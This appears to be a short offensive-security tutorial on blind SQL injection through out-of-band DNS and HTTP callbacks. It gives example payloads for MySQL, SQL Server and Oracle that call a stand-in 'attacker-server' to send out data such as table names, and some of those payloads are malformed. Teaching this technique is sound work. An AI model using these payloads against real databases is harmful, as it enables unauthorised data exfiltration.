# 📡 Exploiting Blind SQL Injection Using Out-of-Band (OAST) Techniques

Out-of-band (OAST) techniques are the "last resort" for blind SQL injection. Use when application is completely "silent" - no data shown, no errors, no delays.

## The Problem: The Silent Thread

The application takes your input, hands it to a background process. Main thread sends success immediately. You can't see changes. Like throwing message into a black hole.

## The Solution: Phone Home

Force the **database itself** to talk to a server you control. Inject command that makes database do DNS lookup to your domain.

- **Standard Blind SQL:** Ask DB a question, sense answer via behavior
- **OAST SQL:** Tell DB "If admin password starts with 'A', visit my-site.com"

## How It Works

Database functions that interact with file system or network:
- **Oracle:** `UTL_HTTP` or `UTL_INADDR`
- **SQL Server:** `xp_dirtree` to network share

## The Workflow

1. **Inject:** Send payload triggering DNS lookup to your server
2. **Wait:** App responds OK immediately
3. **Check:** Look at OAST listener. If "ping" arrives from database's IP, you confirmed injection!

## OAST Listener Services

- **Burp Collaborator** - Built into Burp Suite
- **Interact.sh** - Free OAST platform
- **Pingback** - DNS-based tracking
- **Custom DNS server** - Full control

## Practical OAST Payloads

### MySQL/MariaDB
```sql
SELECT INTO OUTFILE '\\\\attacker-server\\share\\file'
```

### SQL Server
```sql
exec xp_dirtree '\\attacker-server\share\'
```

### Oracle
```sql
SELECT UTL_HTTP.request('http://attacker-server/callback?data=' || table_name) FROM information_schema.tables;
```

## Advantages

- Works even with uniform responses
- Large data exfiltration
- Hard to detect without network monitoring
- Time-independent (no jitter issues)

## Disadvantages

- Requires DB permissions for network functions
- Firewall may block
- Needs attacker infrastructure
- Complex setup